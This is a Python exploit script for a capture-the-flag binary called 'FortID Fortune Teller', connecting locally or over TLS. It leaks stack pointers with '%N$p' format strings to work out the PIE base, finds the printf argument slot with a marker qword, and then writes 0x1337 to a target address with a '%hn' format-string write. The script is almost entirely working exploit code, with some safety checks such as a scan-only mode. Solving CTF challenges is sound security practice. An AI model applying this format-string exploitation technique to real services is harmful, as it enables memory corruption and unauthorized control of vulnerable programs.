#!/usr/bin/env python3
"""FortID Fortune Teller: robust PIE leak discovery and format-string write.

Uses Python standard library; no pwntools. Works with the supplied ELF locally
and can use TLS for the remote challenge service.

    python3 fortune_teller_tls_adaptive.py --local ./fortune
    python3 fortune_teller_tls_adaptive.py --host HOST --port 1337 --tls --insecure
    python3 fortune_teller_tls_adaptive.py --host HOST --port 1337 --tls --insecure --scan-only

The symbol offsets are from the supplied ELF. An unrecognized remote binary is
NOT treated as compatible: leak calibration must yield plausible PIE addresses.
"""
import argparse
import collections
import re
import socket
import ssl
import struct
import subprocess
import sys

KNOWN_LEAK_OFFSETS = {
    0x3d68: ".fini_array pointer (PIE + 0x3d68)",
    0x1664: "main return-site (PIE + 0x1664)",
    0x1441: "read_choice return-site (PIE + 0x1441)",
    0x1570: "main text pointer (PIE + 0x1570)",
    0x11c0: "_start pointer (PIE + 0x11c0)",
}
DEFAULT_BLESSING_OFFSET = 0x404c
TARGET = 0x1337
MARKER = 0x4b4a494847464544  # 'DEFGHIJK' packed as a qword


class Channel:
    def __init__(self, reader, writer):
        self.reader, self.writer = reader, writer

    def until(self, delim, max_bytes=131072):
        res = bytearray()
        while not res.endswith(delim):
            if len(res) >= max_bytes:
                raise RuntimeError(f"Read limit exceeded while waiting for {delim!r}; tail {res[-160:]!r}")
            b = self.reader.read(1)
            if not b:
                raise EOFError(f"Disconnected waiting for {delim!r}, tail {res[-240:]!r}")
            res += b
        return bytes(res)

    def send(self, value):
        self.writer.write(value)
        self.writer.flush()

    def oracle(self, question):
        # question is a single line <=255 bytes, matching read_line(256).
        if b'\n' in question or len(question) > 255:
            raise ValueError("Question must be a single line with <=255 bytes")
        self.until(b'> ')
        self.send(b'1\n')
        self.until(b'> ')
        self.send(question + b'\n')
        self.until(b'The oracle speaks:\n')
        return self.until(b'\n', max_bytes=32768).rstrip(b'\n')


def pointer_from_response(response):
    match = re.fullmatch(rb'0x([0-9a-fA-F]+)', response.strip())
    return int(match.group(1), 16) if match else None


def discover_base(ch, first=6, last=72):
    """Probe one positional pointer per menu cycle; short reads avoid truncation.

    Score PIE candidates by number of mutually consistent known offsets. Scan
    into the same process so ASLR base does not change between leak and write.
    """
    hits = collections.defaultdict(list)
    other_elf = []
    for index in range(first, last + 1):
        response = ch.oracle(f'%{index}$p'.encode())
        ptr = pointer_from_response(response)
        if ptr is None:
            continue
        if 0x500000000000 <= ptr < 0x700000000000:
            other_elf.append((index,ptr))
        for offset, description in KNOWN_LEAK_OFFSETS.items():
            base = ptr - offset
            if (base & 0xfff) == 0 and 0x500000000000 <= base < 0x700000000000:
                hits[base].append((index, offset, ptr, description))
    print(f'[*] scanned %{first}$p..%{last}$p, found {len(other_elf)} likely ELF pointers', file=sys.stderr)
    for index, ptr in other_elf:
        print(f'    %{index}$p = {ptr:#x}  low12={ptr&0xfff:#05x}', file=sys.stderr)
    if not hits:
        raise RuntimeError('No base matched offsets from provided ELF. Remote may differ. Send the scan output to ChatGPT, do not guess.')
    ordered = sorted(hits.items(), key=lambda item:len(item[1]), reverse=True)
    base, evidence = ordered[0]
    if len(ordered) > 1 and len(ordered[0][1]) == len(ordered[1][1]):
        print('[!] Several equally scored PIE bases; inspect candidates before exploitation:', file=sys.stderr)
        for b, es in ordered[:8]:
            print(f'    PIE {b:#x} evidence {[(n,hex(off)) for n,off,_,_ in es]}', file=sys.stderr)
        raise RuntimeError('Ambiguous PIE base; refusing write')
    print(f'[+] PIE base {base:#x} backed by {len(evidence)} matching leak(s):', file=sys.stderr)
    for i,offset,ptr,description in evidence:
        print(f'    arg{i}: {ptr:#x} = PIE + {offset:#x} ({description})', file=sys.stderr)
    return base


def discover_write_slot(ch, min_index=6, max_index=18):
    """Find printf argument referencing a marker appended at offset 16.

    Marker never contains newline or NUL, but the format does terminate at
    offset 16; this tests argument layout without causing any write.
    """
    positions=[]
    for idx in range(min_index,max_index+1):
        prefix=f'%{idx}$p'.encode()
        payload=prefix.ljust(16,b'\0')+struct.pack('<Q', MARKER)
        reply=ch.oracle(payload)
        found=pointer_from_response(reply)
        if found==MARKER:
            positions.append(idx)
    if len(positions)!=1:
        raise RuntimeError(f'Write slot not uniquely found: {positions}; no writes attempted')
    print(f'[+] appended qword at question+16 is printf arg {positions[0]}',file=sys.stderr)
    return positions[0]


def exploit(ch, scan_only=False, first=6, last=72, pie_base=None, write_arg=None, blessing_offset=DEFAULT_BLESSING_OFFSET):
    if pie_base is None:
        pie_base=discover_base(ch,first,last)
    else:
        print(f'[*] Using manually provided PIE base {pie_base:#x}',file=sys.stderr)
    if write_arg is None:
        write_arg=discover_write_slot(ch)
    if scan_only:
        print(f'[+] Diagnostic complete: PIE={pie_base:#x}, write_arg={write_arg}', file=sys.stderr)
        return
    target_address=pie_base+blessing_offset
    fmt=f'%{TARGET}c%{write_arg}$hn'.encode()
    if len(fmt)>16:
        raise RuntimeError('Format string longer than 16-byte alignment; refusing write')
    print(f'[*] Writing {TARGET:#x} to blessing address {target_address:#x}',file=sys.stderr)
    output=ch.oracle(fmt.ljust(16,b'\0')+struct.pack('<Q',target_address))
    print(f'[*] %hn emitted {len(output)} bytes from printf',file=sys.stderr)
    ch.until(b'> ')
    ch.send(b'2\n')
    outcome=ch.until(b'\n')
    print(outcome.decode(errors='replace').strip())
    if b'The stars are aligned.' not in outcome:
        raise RuntimeError(f'Blessing failed: {outcome!r}')
    print(ch.until(b'\n').decode(errors='replace').strip())


def main():
    ap=argparse.ArgumentParser(description=__doc__)
    group=ap.add_mutually_exclusive_group(required=True)
    group.add_argument('--local', metavar='ELF')
    group.add_argument('--host')
    ap.add_argument('--port',type=int)
    ap.add_argument('--tls',action='store_true',help='connect using SSL/TLS')
    ap.add_argument('--insecure',action='store_true',help='disable cert validation for ephemeral CTF hostname')
    ap.add_argument('--scan-only',action='store_true',help='perform non-destructive leak / write-slot diagnostics only')
    ap.add_argument('--first',type=int,default=6)
    ap.add_argument('--last',type=int,default=72)
    ap.add_argument('--pie-base',type=lambda v:int(v,0))
    ap.add_argument('--write-arg',type=int)
    ap.add_argument('--blessing-offset',type=lambda v:int(v,0),default=DEFAULT_BLESSING_OFFSET)
    args=ap.parse_args()
    if args.first<1 or args.last<args.first or args.last>180:
        ap.error('invalid scan range')
    if args.host:
        if not args.port:ap.error('--port required with --host')
        with socket.create_connection((args.host,args.port),timeout=20) as raw:
            raw.settimeout(20)
            if args.tls:
                ctx=ssl.create_default_context()
                if args.insecure:
                    ctx.check_hostname=False
                    ctx.verify_mode=ssl.CERT_NONE
                sock=ctx.wrap_socket(raw,server_hostname=args.host)
            else:sock=raw
            with sock.makefile('rwb',buffering=0) as stream:
                exploit(Channel(stream,stream),args.scan_only,args.first,args.last,
                        args.pie_base,args.write_arg,args.blessing_offset)
    else:
        with subprocess.Popen([args.local],stdin=subprocess.PIPE,stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE) as proc:
            exploit(Channel(proc.stdout,proc.stdin),args.scan_only,args.first,args.last,
                    args.pie_base,args.write_arg,args.blessing_offset)


if __name__=='__main__':main()
